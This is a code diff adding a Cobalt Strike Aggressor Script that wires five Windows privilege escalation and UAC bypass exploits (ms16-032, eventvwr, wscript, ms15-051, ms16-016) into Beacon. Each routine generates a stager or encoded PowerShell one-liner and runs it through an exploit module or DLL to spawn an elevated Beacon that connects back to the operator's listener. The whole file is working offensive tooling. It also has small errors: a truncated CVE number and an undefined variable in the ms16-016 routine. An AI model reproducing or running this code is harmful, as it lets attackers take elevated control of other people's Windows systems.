@@ -1,0 +1,137 @@
+#
+# Integrate several privilege escalation exploits into Cobalt Strike via Aggressor Script
+# 
+
+# Integrate ms16-032
+# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
+
+sub ms16_032_exploit {
+	local('$script $oneliner');
+
+	# acknowledge this command
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via ms16-032");
+
+	# generate a PowerShell script to run our Beacon listener
+	$script = artifact($2, "powershell");
+
+	# host this script within this Beacon
+	$oneliner = beacon_host_script($1, $script);
+
+	# task Beacon to run this exploit with our one-liner that runs Beacon
+	bpowershell_import!($1, script_resource("modules/Invoke-MS16032.ps1"));
+	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
+
+	# give it another 10s to work.
+	bpause($1, 10000);
+
+	# handle staging
+	bstage($1, $null, $2);
+}
+
+beacon_exploit_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_exploit); 
+
+# Integrate Matt Nelson's file-less eventvwr.exe Bypass UAC attack
+# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
+
+sub eventvwr_exploit {
+	# acknowledge this command
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context");
+
+	# generate a PowerShell script to run our Beacon listener
+	$script = artifact($2, "powershell");
+
+	# host this script within this Beacon
+	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
+
+	# task Beacon to run this exploit with our one-liner that runs Beacon
+	bpowershell_import!($1, script_resource("modules/Invoke-EventVwrBypass.ps1"));
+	bpowerpick!($1, "Invoke-EventVwrBypass -Command \" $+ $oneliner $+ \"");
+
+	# handle staging
+	bstage($1, $null, $2);
+}
+
+beacon_exploit_register("uac-eventvwr", "Bypass UAC with eventvwr.exe", &eventvwr_exploit);
+
+# Integrate wscript.exe Bypass UAC attack
+# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
+
+sub wscript_exploit {
+	# acknowledge this command
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context");
+
+	# generate a PowerShell script to run our Beacon listener
+	$script = artifact($2, "powershell");
+
+	# host this script within this Beacon
+	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
+
+	# task Beacon to run this exploit with our one-liner that runs Beacon
+	bpowershell_import!($1, script_resource("modules/Invoke-WScriptBypassUAC.ps1"));
+	bpowerpick!($1, "Invoke-WScriptBypassUAC -payload \" $+ $oneliner $+ \"");
+
+	# handle staging
+	bstage($1, $null, $2);
+}
+
+beacon_exploit_register("uac-wscript", "Bypass UAC with wscript.exe", &wscript_exploit);
+
+# Integrate windows/local/ms15_051_client_copy_image from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
+
+sub ms15_051_exploit {
+	# acknowledge this command
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms15-051");
+
+	# tune our parameters based on the target arch
+	if (-is64 $1) {
+		$arch   = "x64";
+		$dll    = "modules/cve-2015-1701.x64.dll";
+	}
+	else {
+		$arch   = "x86";
+		$dll    = "modules/cve-2015-1701.x86.dll";
+	}
+
+	# generate our shellcode
+	$stager = shellcode($2, false, $arch);
+
+	# make sure we have shellcode for this listener (some stagers are x86 only)
+	if ($stager is $null) {
+		berror($1, "No $arch stager for listener ' $+ $2 $+ '");
+		return;
+	}
+
+	# spawn a Beacon post-ex job with the exploit DLL
+	bdllspawn!($1, script_resource($dll), $stager, "ms15-051", 5000);
+
+	# stage our payload (if this is a bind payload)
+	bstage($1, $null, $2, $arch);
+}
+
+beacon_exploit_register("ms15-051", "Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)", &ms15_051_exploit);
+
+# Integrate windows/local/ms16_016_webdav from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb
+
+sub ms16_016_exploit {
+	# check if we're on an x64 system and error out.
+	if (-is64 $1) {
+		berror($1, "ms16-016 exploit is x86 only");
+		return;
+	}
+
+	# acknowledge this command
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
+
+	# generate our shellcode
+	$stager = shellcode($2, false, "x86");
+
+	# spawn a Beacon post-ex job with the exploit DLL
+	bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+
+	# stage our payload (if this is a bind payload)
+	bstage($1, $null, $2, $arch);
+}
+
+beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
